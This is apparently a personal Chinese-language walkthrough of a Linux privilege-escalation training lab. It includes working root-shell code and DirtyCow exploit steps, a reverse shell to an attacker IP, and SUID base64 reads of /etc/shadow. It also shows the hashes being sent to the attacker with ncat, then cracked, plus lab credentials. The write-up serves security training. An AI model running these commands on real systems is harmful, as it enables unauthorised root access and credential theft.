# linprivesc

### 總結來說，這個靶場有點不好玩，很多坑。




**SSH**
```
Username: karen
Password: Password1

ssh karen@10.10.8.64
```


---


## 枚舉

### 主機名稱/版本/發行版/信息
```
whoami

hostname

uname -a

cat /proc/version

cat /etc/issue
```

### 查看進程

```
ps -A
ps axjf
ps -aux

-a：顯示所有使用者的進程，而不僅僅是與終端有關的進程。
-u：以用戶的格式顯示詳細信息，包括用戶名、進程ID（PID）、CPU使用率、記憶體使用率等。
-x：顯示沒有控制終端的進程。
```



### 環境變數，以及sudo權限
```
env

sudo -l

ls -al 
```


### 查看用戶

```
cat /etc/passwd | cut -d ":" -f 1


顯示用戶的所屬群組
id 
id root


快速找出使用者帳戶
cat /etc/passwd | grep home

```



### 查看歷史命令

```
要查看最後的 10 條命令
history 10

您還可以使用 Ctrl + R 快捷鍵進行反向搜索
```




## 網路狀態
```

ifconfig

路由
ip route


顯示所有監聽連接埠和已建立的連線。
netstat -a


TCP
netstat -at


UDP
netstat -au


列出連線以及名稱和PID資訊。
netstat -tp


列出處於「監聽」模式的連接埠
netstat -l


偵聽的連接埠
netstat -ltp


網卡狀態
netstat -i



netstat -ano
-a：顯示所有socket
-n: 不解析名稱
-o：顯示定時器

```


---


## 尋找

```
# 在目前目錄下找到名為「flag1.txt」的文件
find . -name flag1.txt


# 在/home目錄下找到檔案名稱“flag1.txt”
find /home -name flag1.txt


# 找到「/」下名為config的目錄
find / -type d -name config


# 尋找具有777權限的檔案（所有使用者可讀、可寫入、可執行的檔案）
find / -type f -perm 0777


# 尋找可執行文件
find / -perm a=x


# 查找“/home”下用戶“frank”的所有文件
find /home -user frank


# 尋找最近10天內修改過的文件
find / -mtime 10


# 尋找最近 10 天內造訪過的文件
find / -atime 10


# 尋找最近一小時（60 分鐘）內更改的文件
find / -cmin -60


# 尋找最近一小時（60 分鐘）內的文件存取狀況
find / -amin -60


# 查找50MB大小的文件
find / -size 50M
```

### 尋找全域可寫資料夾
```

//不太準
find / -writable -type d 2>/dev/null   

//比較準
find / -perm -222 -type d 2>/dev/null


find / -perm -o w -type d 2>/dev/null
```

### 尋找全域可執行資料夾

```
find / -perm -o x -type d 2>/dev/null

```



### 尋找開發工具和支援的語言
```
find / -name perl*
find / -name python*
find / -name gcc*



which python
which python3

python -V

python3 -V 
```



### 尋找設定了 SUID 位元的檔案
```
find / -perm -u=s -type f 2>/dev/null
```

---



## 自動枚舉工具

```
LinPeas
LinEnum
LES (Linux Exploit Suggester)
Linux Smart Enumeration
Linux Priv Checker
```



**尋找具有任何使用者（所有者、群組和其他人）都具有可執行權限的目錄**
```
find / -type d -perm -007 2>/dev/null
```

**找到 一堆，我選擇 /tmp**
```
/var/metrics
/var/crash
/var/tmp
/run/shm
/run/lock
/tmp
/tmp/.ICE-unix
/tmp/.X11-unix

```


### Linux Exploit Suggester
```
下載LES (Linux Exploit Suggester)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

kali 開啟 WEB服務
php -S 0.0.0.0:80

下載執行
wget -P /tmp http://10.18.1.192/les.sh
chmod +x les.sh
./les.sh
```



**從exploit DB 找到並使用。**
```
wget -P /tmp http://10.18.1.192/40616.c


gcc 40616.c -o cowroot  -pthread
chmod +x cowroot
./cowroot
```

---

## 權限提升：Sudo

**GTFOBins（Get The F*** Out of Bins）**
是一个开源的项目，旨在提供关于二进制文件滥用的信息，尤其是在渗透测试和渗透攻击中的应用。该项目汇总了各种操作系统上常见的二进制文件（Bins）中的安全绕过技术和特权升级方法。

window版
```
https://lolbas-project.github.io/#
```
linux版
```
https://gtfobins.github.io/
```






### LD_PRELOAD 是一個允許任何程式使用共享庫的函數

檢查 LD_PRELOAD（使用 env_keep 選項）
編寫一個簡單的 C 程式碼編譯為共享物件（.so 副檔名）文件
使用 sudo 權限和指向我們的 .so 檔案的 LD_PRELOAD 選項來執行程式

**shell.c**
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}

```
* C 程式碼將簡單地產生一個 root shell




**gcc 使用以下參數將其編譯為共享物件檔案；**
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles


gcc: GNU Compiler Collection，用于编译 C 代码的编译器。
-fPIC: 生成位置独立的代码，通常在共享库中使用。
-shared: 生成共享库。
-o shell.so: 指定输出文件的名称为 shell.so，这是生成的共享库的文件名。
shell.c: 输入的 C 代码文件。
-nostartfiles: 不使用标准的启动文件，这意味着不使用标准的 C 运行时启动代码
```



**sudo -l**
```
sudo -l

    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

```
* 這題沒有env_keep=LD_PRELOAD 不知道搞啥鬼，白費力氣了





**當啟動使用者可以使用 sudo 運行的任何程式時這將導致產生具有 root 權限的 shell。**
假裝有 env_keep=LD_PRELOAD
```
sudo LD_PRELOAD=/tmp/shell.so find
```



---

## 權限提升：SUID

將列出設定了 SUID 或 SGID 位元的檔案。
```
find / -type f -perm -04000 -ls 2>/dev/null
```



找到 base64 讀取 /etc/shadow

```
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```


### 破解密碼
```

unshadow passwd.txt shadow.txt > john_input

john --wordlist=/usr/share/wordlists/rockyou.txt john_input


Password1        (karen)     
Password1        (user2)     
test123          (gerryconway)  
```


---
##  Capabilities 提權



Linux 的Capabilities是一种细粒度的权限控制机制，允许进程在不需要完全root权限的情况下执行某些特权操作。通过Capabilities，进程可以获取一组特定的权限，而不必成为超级用户（root）。

在Capabilities的模型下，每个进程都被赋予一组能力，这些能力控制了它可以执行的系统操作。这与传统的基于用户和组的权限模型不同，传统模型通常是一旦拥有了超级用户权限，就可以执行系统上的任何操作。


**获取文件或目录上设置的能力（capabilities）**
```
getcap -r / 2>/dev/null


/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper =cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep


```


**找到vim = cap_setuid+ep**
```
cap_setuid+ep 表示 /home/karen/vim 文件具有设置用户标识（setuid）能力，并且具有可执行（执行权限）的权限
```



**注意vim要支持python3 或python   vim --version 查看**
```
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
/home/karen/vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

* 假设你试图在 /usr/bin/view 上执行相同的操作，可能会得到权限不足的错误，因为 /usr/bin/view 没有被赋予 cap_setuid+ep 能力，而只有 /home/ubuntu/view 具有这个能力。


---
## Cron 提權

cron 是一个用于定期执行任务的后台守护进程。crontab 是用户的定时任务表，用于配置 cron 作业的执行计划。
Crontab 始終值得檢查，因為它有時會導致輕鬆的權限升級向量。在不具備一定網路安全成熟度等級的公司中，以下情況並不少見：

```
cat /etc/crontab


* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py

```



**覆蓋為反向shell**
```
ls -al  /home/karen/backup.sh

-rw-r--r-- 1 karen karen 77 Jun 20  2021 /home/karen/backup.sh


echo "bash -i >& /dev/tcp/10.18.1.192/4444 0>&1" > /home/karen/backup.sh

nc -lvnp 4444
```

//這題我實驗有問題，拿不到root shell



---


## PATH 提權


**PATH 是我們這裡討論的環境變量劫持**

```
echo $PATH
```


1. `/home/kali/.local/bin`: 包含用户特定二进制文件的目录。
2. `/usr/local/sbin`: 用于本地管理的系统二进制文件。
3. `/usr/sbin`: 用于系统管理的系统二进制文件。
4. `/sbin`: 用于引导、修复和恢复的系统关键二进制文件。
5. `/usr/local/bin`: 用于本地安装的用户二进制文件。
6. `/usr/bin`: 用于系统范围使用的用户二进制文件。
7. `/bin`: 用于引导和修复系统所需的关键二进制文件。
8. `/usr/local/games`: 本地安装的游戏的二进制文件。
9. `/usr/games`: 系统范围游戏的二进制文件。


設定了 SUID 位元的「path」腳本

path
```
#include <unistd.h>
void main()
{
	setuid(0);
	setgid(0);
	system("thm");
}
```

* 執行後，「path」將在 所有環境變量 中尋找名為「thm」的可執行檔。




**找可寫資料夾**
```
find / -writable 2>/dev/null
find / -perm -222 -type d 2>/dev/null

/tmp

```


**tmp 加入 環境變量**
```
export PATH=/tmp:$PATH
```
* 此時，路徑腳本也會在 /tmp 資料夾下尋找名為「thm」的可執行檔。




**/tmp 寫入一個shell 到 thm**
```
echo "/bin/bash" > thm
chmod +x thm
```




**作者幫我們GCC 編譯了並产生了一个可执行的带SUID位的文件 test**
```
ls -al /home/murdoch/test
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
有設SUID


執行了一個root shell 
/home/murdoch/test
```




---
## 權限提升：NFS

NFS（網路檔案共用）配置儲存在 /etc/exports 檔案中，該檔案是在 NFS 伺服器安裝期間建立的，通常可供使用者讀取


把對方的網路共享目路，掛載到攻擊者主機上。


**注意:**
這題我kali GCC編譯的版本跟 受害者端不同，所以我事前先用受害者端的前幾個靶場編譯過myshell.c了。
如果不這樣做，會執行不了。




登入後查看本地NFS 文件
```
cat /etc/exports


/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)



*(rw,sync,insecure,no_root_squash,no_subtree_check): 表示所有主机（*）都可以以读写（rw）的方式挂载这个共享目录。
sync: 数据同步写入，确保写入完成后才返回成功。
insecure: 允许不受信任的客户端连接（通常用于测试环境）。
no_root_squash: 允许客户端以 root 身份写入，而不映射为匿名用户。
no_subtree_check: 不检查子目录。


```

* 在 NFS 客户端上的 root 用服務系统上的 root 用户拥有相同的权限






**kali 查詢對方 10.10.176.220 的主机上的 NFS 共享**
```
showmount -e 10.10.198.239




Export list for 10.10.198.239:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```
* 上面三個只有/tmp 有RWX 



**在attacker 創建 /tmp/backupsonattack 目錄**
```
mkdir /tmp/backupsonattack
```


**掛載對方的tmp目錄 到 backupsonattack目錄**
```
sudo mount -o rw 10.10.198.239:/tmp /tmp/backupsonattack

sudo mount -o rw 10.10.198.239:/home/backup  /tmp/backupsonattack

sudo mount -o rw 10.10.198.239:/home/ubuntu/sharedfolder  /tmp/backupsonattack

```

**查看掛載狀態**
```
mount | grep backupsonattack
```

**想取消掛載使用這個**
```
sudo umount /tmp/backupsonattack

sudo umount -l /tmp/backupsonattack

```




**創建myshell.c**

```
int main()
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
```



```
gcc myshell.c -o myshell -w
```


**設定 SUID 位元。**
```
chmod +s myshell

//-rwsr-sr-x  1 root root 8617 Nov 29 04:37 myshell

./myshell

```



---



## 挑戰

Username: leonard
Password: Penny123
ssh leonard@10.10.200.110






id
```
uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

hostname
```
ip-10-10-5-141
```


uname -a 
```
Linux ip-10-10-194-116 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```


cat /proc/version
```
Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020

```
`3.10.0-1160.el7` 
1. **主版本号（Major Version）: `3`**
   - 这是Linux内核的主要版本。更高的主版本号通常表示具有新功能和更改的主要发布。

2. **次版本号（Minor Version）: `10`**
   - 次版本号指定内核的次要版本。通常，偶数表示稳定版本，奇数表示开发或测试版本。在这里，`10` 表示一个稳定版本。

3. **修订版本号（Patch Level）: `0`**
   - 修订版本号表示内核的修订级别或小的变化。在这里，`0` 表示主要版本和次要版本之间没有小的变化。

4. **补丁级别（Patch Level）: `1160`**
   - 补丁级别表示内核的具体版本。这个数字通常会随着每个发布而递增。在这里，`1160` 是CentOS 7内核版本的具体标识。

5. **发行版标识（Distribution Identifier）: `.el7`**
   - 发行版标识通常表示内核是为哪个Linux发行版编译的。在这里，`.el7` 表示这个内核是为CentOS 7发行版编译的。
---------------------------------------



cat /etc/issue
```
Kernel \r on an

```

sudo -l (不能用)




尋找具有SUID位元的文件

find / -perm -u=s -type f 2>/dev/null
```
/usr/bin/base64
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/Xorg
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/kde4/kpac_dhcp_helper
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/qemu-bridge-helper
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
/usr/libexec/flatpak-bwrap
```





查看Capabilities
getcap -r / 2>/dev/null
```
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```



cat /etc/crontab 沒東西



本地沒開放NFS
cat /etc/exports


檢查目標有無開放 (沒有)
showmount -e 10.10.194.116



### 開始列舉可能的。

SUID
```
ls -al /usr/bin/base64
-rwsr-xr-x. 1 root root 37360 Aug 20  2019 /usr/bin/base64


ls -al /usr/bin/at
-rwsr-xr-x. 1 root root 53048 Oct 30  2018 /usr/bin/at
```



```
LFILE=/etc/passwd
base64 "$LFILE" | base64 --decode > passwd.txt



LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode > shadow.txt
```



受害者傳過來
```
ncat 10.18.1.192 4444 < passwd.txt
ncat 10.18.1.192 4444 < shadow.txt
```

攻擊者監聽
```
nc -l -p 4444 > passwd.txt
nc -l -p 4444 > shadow.txt
```



破解
```
unshadow passwd.txt shadow.txt > password.txt
john password.txt --wordlist=/usr/share/wordlists/rockyou.txt

破解missy密碼
Password1        (missy) 

```
---------------------------------

**登入missy**

sudo -l 找到 sudo find 
```
User missy may run the following commands on ip-10-10-200-110:
    (ALL) NOPASSWD: /usr/bin/find

```


提權
```
sudo find . -exec /bin/sh \; -quit

找到flag
find / -name flag1.txt 2>/dev/null 

打印
cat /home/missy/Documents/flag1.txt
```








